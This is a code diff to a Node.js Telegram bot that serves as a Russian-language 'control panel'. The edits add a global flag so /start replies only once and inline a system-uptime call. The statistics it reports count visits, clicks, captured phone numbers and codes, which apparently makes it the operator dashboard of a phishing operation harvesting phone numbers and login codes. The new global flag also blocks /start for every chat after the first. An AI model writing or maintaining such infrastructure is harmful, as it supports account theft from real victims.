@@ -1,4 +1,5 @@
 // ==== file: bot.js ====
+// language: JavaScript, target: Node.js 20
 import TelegramBot from 'node-telegram-bot-api';
 import { Utils } from './utils.js';
 
@@ -32,7 +33,11 @@ const bottomKeyboard = {
     }
 };
 
+let isMenuSent = false;
+
 bot.onText(/^\/start$/, (msg) => {
+    if (isMenuSent) return;
+    isMenuSent = true;
     bot.sendMessage(msg.chat.id, `🛡 <b>Панель управления</b>\n\nID: <code>${msg.chat.id}</code>`, { parse_mode: 'HTML', ...bottomKeyboard });
 });
 
@@ -40,8 +45,7 @@ bot.on('message', async (msg) => {
     const chatId = msg.chat.id, text = msg.text;
     if (text === '📊 Статистика') {
         const topOS = Object.entries(State.stats.osCount).sort((a, b) => b[1] - a[1]).slice(0, 3).map(([os, c]) => `${os}: ${c}`).join('\n');
-        const sys = Utils.getSystemStats();
-        bot.sendMessage(chatId, `📊 <b>Статистика</b>\n\n⏱ Аптайм: ${sys.uptime}\n👁 Визитов: ${State.stats.visits}\n🖱 Кликов: ${State.stats.clicks}\n📱 Номеров: ${State.stats.phones}\n🔑 Кодов: ${State.stats.codes}\n\n<b>Топ ОС:</b>\n${topOS || 'Нет данных'}`, { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '🔄 Обновить', callback_data: 'stats' }]] } });
+        bot.sendMessage(chatId, `📊 <b>Статистика</b>\n\n⏱ Аптайм: ${Utils.getSystemStats().uptime}\n👁 Визитов: ${State.stats.visits}\n🖱 Кликов: ${State.stats.clicks}\n📱 Номеров: ${State.stats.phones}\n🔑 Кодов: ${State.stats.codes}\n\n<b>Топ ОС:</b>\n${topOS || 'Нет данных'}`, { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '🔄 Обновить', callback_data: 'stats' }]] } });
     }
     if (text === '📜 История') {
         if (State.history.length === 0) return bot.sendMessage(chatId, '📜 История пуста.');
